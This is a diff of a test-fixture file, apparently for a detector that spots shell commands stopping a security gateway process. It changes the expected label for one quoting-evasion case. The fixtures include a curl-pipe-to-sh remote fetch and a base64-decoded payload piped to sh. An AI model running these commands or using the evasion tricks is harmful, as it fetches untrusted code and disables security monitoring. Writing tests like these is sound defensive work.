@@ -300,7 +300,7 @@
 {"id": "g596r2-k202", "dialect": "", "command": "bash -c \"defenseclaw-gateway $ACT\"", "want": "unproven"}
 {"id": "g596r2-k203", "dialect": "", "command": "eval \"defenseclaw-gateway $ACT\"", "want": "unproven"}
 {"id": "g596r2-k204", "dialect": "", "command": "echo ZGVmZW5zZWNsYXctZ2F0ZXdheSBzdG9w | base64 -d | sh", "want": ""}
-{"id": "g596r2-k205", "dialect": "", "command": "defenseclaw-gateway $'stop'", "want": "unproven"}
+{"id": "g596r2-k205", "dialect": "", "command": "defenseclaw-gateway $'stop'", "want": "stop"}
 {"id": "g596r2-k206", "dialect": "", "command": "defenseclaw-gateway 'st''op'", "want": "stop"}
 {"id": "g596r2-k207", "dialect": "", "command": "alias dg=defenseclaw-gateway; dg stop", "want": "stop"}
 {"id": "g596r2-k208", "dialect": "", "command": "curl -s http://x/y.sh | sh", "want": ""}
